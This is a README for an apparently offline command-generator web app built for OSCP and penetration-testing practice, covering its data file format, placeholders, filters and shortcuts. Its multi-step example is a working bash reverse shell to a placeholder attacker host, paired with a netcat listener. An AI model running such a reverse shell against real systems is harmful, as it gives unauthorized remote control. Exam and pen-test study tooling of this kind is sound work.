# OSCP Command Generator

A lightweight, offline-friendly command template browser + generator for OSCP/pen-test workflows.

- Load commands from simple `.txt` files in `/data`
- Fill placeholders (e.g. `<target>`, `<user>`, `<password>`) from the left sidebar
- Search instantly without re-render flicker (DOM hide/show filtering)
- Filter by **Credential**, **Non-credential**, **Priority**, and **Favorites**
- Copy full commands (or individual steps) with one click
- Highlight placeholders, flags, operators, and `#comments` (but not numbering like `#2`)

---

## Project Structure

```
oscp-command-generator/
├─ index.html
├─ css/
│  └─ style.css
├─ data/
│  ├─ reconnaissance.txt
│  ├─ web.txt
│  ├─ smb.txt
│  └─ ...
└─ README.md
```

> **Important:** This project expects the web server to allow directory listing for `/data/`
so the app can discover categories automatically.

---

## Getting Started

### Option A — Quick run (recommended)
Use a tiny local server so `fetch()` works and `/data/` can be read.

**Python**
```bash
python -m http.server 8000
```

Then open:
- `http://localhost:8000/`

**Node (http-server)**
```bash
npx http-server -p 8000
```

### Option B — VS Code Live Server
1. Install “Live Server”
2. Right-click `index.html` → **Open with Live Server**

---

## Command File Format (`/data/*.txt`)

Each non-empty line is one command entry:

```
Title: command here
```

### Priority commands
Prefix the line with `^`:
```
^Nmap quick scan: nmap -sC -sV <target>
```

### Multi-step commands
If the **same title appears multiple times**, the app merges them into one card and treats them as multi-step:

```
Reverse shell: nc -lvnp <kaliPort>
Reverse shell: bash -i >& /dev/tcp/<kali>/<kaliPort> 0>&1
```

These display as **Step 1 / Step 2** with individual copy buttons.

### Comments inside commands
You can add comments after a header or command using `#...`:

```
Base64 transfer: base64 -d <filename2> > <filename1> #target-machine
```

`#target-machine` will be highlighted in a soothing accent color.
Numbering like `#2` is **not** treated as a comment.

---

## Placeholders (Tags)

Supported placeholders include:

- `<target>` Target IPv4
- `<target6>` Target IPv6
- `<port>` Target Port
- `<kali>` Kali IPv4
- `<kali6>` Kali IPv6
- `<kaliPort>` Kali Port
- `<user>` Username
- `<password>` Password
- `<domain>` Domain
- `<dc-ip>` Domain Controller IP
- `<ntlm>` NTLM Hash
- `<filename1>`, `<filename2>`
- `<wordlist1>`, `<wordlist2>`

Open the **Help** `?` button to see the full list and click a row to focus its input.

> The parser detects tags even in odd formatting like: `<<< <target>`

---

## Filters

Buttons are in this order:

1. **Credential**
2. **Non-credential**
3. **Priority**
4. **Favorites**

### Credential vs Non-credential (mutually exclusive)
- **Credential** = command contains **both** `<user>` **and** `<password>` in the same command/template
- **Non-credential** = everything else
- You **cannot select both**. Clicking one automatically deselects the other.
- If neither is selected → **show all**

---

## Favorites

- Click `☆ / ★` on a card to favorite/unfavorite it
- Favorites are stored in `localStorage`

---

## Copy Rules (Exam Controls)

### Block copy if placeholders remain
If enabled, copy buttons are disabled when required placeholders are still empty.

### Remember non-sensitive inputs
If enabled, the app stores non-sensitive inputs in `localStorage` (e.g. target IP, ports, filenames, wordlists).
Passwords are **not** stored.

---

## Keyboard Shortcuts

- `/` focus Search
- `j` / `k` move selection (when not typing in inputs)
- `c` copy selected card (when not typing in inputs)
- `Ctrl` + `+` / `-` / `0` font scaling

> There are **no** hotkeys for favorites/priority to avoid interrupting typing.

---

## Notes / Requirements

- The app relies on `fetch("data/")` to list categories.
  - This works if your server enables directory listing.
  - If your environment does not allow directory listing, you can:
    - Provide a `data/index.json` listing categories (future enhancement), or
    - Hardcode categories in code.

---

## License

Choose a license (e.g. MIT) and add it as `LICENSE`.
